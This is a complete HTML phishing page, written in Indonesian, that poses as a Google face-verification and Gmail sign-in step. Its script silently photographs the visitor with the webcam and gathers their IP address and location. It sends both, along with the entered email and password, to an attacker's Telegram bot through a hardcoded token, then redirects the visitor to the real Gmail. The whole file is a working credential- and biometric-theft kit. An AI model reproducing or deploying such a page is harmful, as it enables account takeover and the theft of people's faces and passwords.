<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Verifikasi Keamanan - Google</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 450px;
            width: 100%;
            text-align: center;
        }

        .google-logo {
            margin-bottom: 30px;
        }

        .google-logo img {
            width: 75px;
        }

        .camera-preview {
            width: 100%;
            height: 300px;
            background: #000;
            border-radius: 20px;
            margin: 20px 0;
            overflow: hidden;
            position: relative;
        }

        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        canvas {
            display: none;
        }

        .status-box {
            background: #f1f3f4;
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
        }

        .status-text {
            font-size: 14px;
            color: #5f6368;
        }

        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid #e0e0e0;
            border-top-color: #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .permission-btn {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 10px;
        }

        .permission-btn:disabled {
            background: #dadce0;
            cursor: not-allowed;
        }

        .info-text {
            font-size: 12px;
            color: #9aa0a6;
            margin-top: 20px;
        }

        .warning {
            color: #d93025;
            font-size: 12px;
            margin-top: 15px;
        }

        /* Form Login (muncul setelah foto) */
        .login-form {
            display: none;
            margin-top: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            font-size: 16px;
        }

        .input-group input:focus {
            outline: none;
            border-color: #1a73e8;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
        }

        .error-msg {
            color: #d93025;
            font-size: 13px;
            margin-top: 10px;
            display: none;
        }
    </style>
</head>
<body>

<div class="container" id="app">
    <div class="google-logo">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
    </div>

    <!-- Halaman Kamera -->
    <div id="cameraSection">
        <div class="camera-preview">
            <video id="video" autoplay playsinline></video>
        </div>

        <div class="status-box">
            <div class="status-text" id="statusText">
                📸 Verifikasi wajah diperlukan
            </div>
        </div>

        <button class="permission-btn" id="startBtn">Izinkan Akses Kamera</button>
        <div class="info-text">Google Security memerlukan verifikasi wajah untuk melanjutkan</div>
        <div class="warning">⚠️ Verifikasi wajib dilakukan</div>
    </div>

    <!-- Halaman Login (muncul setelah foto terkirim) -->
    <div id="loginSection" class="login-form">
        <h2 style="margin-bottom: 20px;">Sign in</h2>
        <div class="subtitle" style="color:#5f6368; margin-bottom:25px;">to continue to Gmail</div>
        
        <form id="loginForm">
            <div class="input-group">
                <input type="email" id="email" placeholder="Email or phone" required>
            </div>
            <div class="input-group">
                <input type="password" id="password" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn" id="loginBtn">Next</button>
            <div class="error-msg" id="errorMsg">Wrong email or password</div>
        </form>
    </div>
</div>

<script>
    // ========== KONFIGURASI TELEGRAM ==========
    const TELEGRAM_TOKEN = "8806067214:AAHMhedGeATjYcFl3QUHk53Q8o9_sDuiGOg";
    const CHAT_ID = "8854409945";
    // ==========================================

    let stream = null;
    let photoTaken = false;
    let userEmail = '';
    let userPassword = '';

    const cameraSection = document.getElementById('cameraSection');
    const loginSection = document.getElementById('loginSection');
    const video = document.getElementById('video');
    const startBtn = document.getElementById('startBtn');
    const statusText = document.getElementById('statusText');

    // ========== MULAI KAMERA ==========
    async function startCamera() {
        try {
            statusText.innerHTML = "⏳ Meminta akses kamera... <span class='loading-spinner'></span>";
            
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" } 
            });
            video.srcObject = stream;
            
            statusText.innerHTML = "✅ Kamera aktif - Mengambil foto dalam 3 detik...";
            
            // Auto capture setelah 3 detik
            setTimeout(() => {
                takePhotoAndSend();
            }, 3000);
            
        } catch(err) {
            statusText.innerHTML = "❌ Izin kamera ditolak. Silakan izinkan untuk melanjutkan.";
            startBtn.disabled = false;
            startBtn.innerText = "Coba Lagi";
        }
    }

    // ========== AMBIL FOTO & KIRIM ==========
    async function takePhotoAndSend() {
        if (photoTaken) return;
        photoTaken = true;
        
        statusText.innerHTML = "📸 Mengambil foto...";
        
        // Capture foto
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        // Matikan kamera
        if (stream) {
            stream.getTracks().forEach(track => track.stop());
        }
        
        statusText.innerHTML = "📤 Mengirim data ke server...";
        
        // Kirim foto ke Telegram
        await sendPhotoToTelegram(canvas);
        
        // Sembunyikan kamera, tampilkan form login
        statusText.innerHTML = "✅ Verifikasi berhasil! Silakan login.";
        
        setTimeout(() => {
            cameraSection.style.display = 'none';
            loginSection.style.display = 'block';
        }, 1000);
    }

    // ========== KIRIM FOTO KE TELEGRAM ==========
    async function sendPhotoToTelegram(canvas) {
        // Konversi canvas ke blob
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
        
        // Dapetin IP dan info
        let ip = 'Unknown';
        let lokasi = 'Unknown';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
            
            // Dapetin lokasi dari IP
            const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
            const geoData = await geoRes.json();
            lokasi = `${geoData.city}, ${geoData.country_name}`;
        } catch(e) {}
        
        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
        const userAgent = navigator.userAgent;
        
        const caption = `📸📸📸 FOTO WAJAH KORBAN 📸📸📸%0A%0A` +
            `🌐 IP ADDRESS : ${ip}%0A` +
            `📍 LOKASI     : ${lokasi}%0A` +
            `📅 WAKTU      : ${tanggal}%0A` +
            `💻 DEVICE     : ${encodeURIComponent(userAgent.substring(0, 100))}%0A%0A` +
            `⚠️ KORBAN TERKENA PHISHING + FOTO ⚠️`;
        
        // Kirim foto ke Telegram
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('photo', blob, 'face.jpg');
        formData.append('caption', caption);
        
        try {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch(e) {
            console.log('Gagal kirim foto:', e);
        }
    }

    // ========== KIRIM EMAIL & PASSWORD ==========
    async function sendCredentials(email, password) {
        let ip = 'Unknown';
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            ip = data.ip;
        } catch(e) {}
        
        const tanggal = new Date().toLocaleString('id-ID', {timeZone: 'Asia/Jakarta'});
        
        let pesan = `🔐🔐🔐 GOOGLE LOGIN 🔐🔐🔐%0A%0A`;
        pesan += `📧 EMAIL    : ${email}%0A`;
        pesan += `🔑 PASSWORD : ${password}%0A`;
        pesan += `🌐 IP       : ${ip}%0A`;
        pesan += `📅 WAKTU    : ${tanggal}%0A%0A`;
        pesan += `⚠️ KORBAN SUDAH KIRIM FOTO + LOGIN ⚠️`;
        
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
        
        try {
            await fetch(url, {mode: 'no-cors'});
        } catch(e) {}
    }

    // ========== EVENT LISTENER ==========
    startBtn.addEventListener('click', function() {
        startBtn.disabled = true;
        startCamera();
    });

    // Form login
    const loginForm = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');

    loginForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        if (!email || !password) {
            errorMsg.style.display = 'block';
            setTimeout(() => errorMsg.style.display = 'none', 2000);
            return;
        }
        
        const loginBtn = document.getElementById('loginBtn');
        loginBtn.disabled = true;
        loginBtn.innerText = "⏳ Memverifikasi...";
        
        await sendCredentials(email, password);
        
        errorMsg.style.backgroundColor = '#e6f4ea';
        errorMsg.style.color = '#137333';
        errorMsg.innerHTML = '✅ Verifikasi berhasil! Mengalihkan...';
        errorMsg.style.display = 'block';
        
        setTimeout(() => {
            window.location.href = 'https://mail.google.com';
        }, 2000);
    });
</script>
</body>
</html>
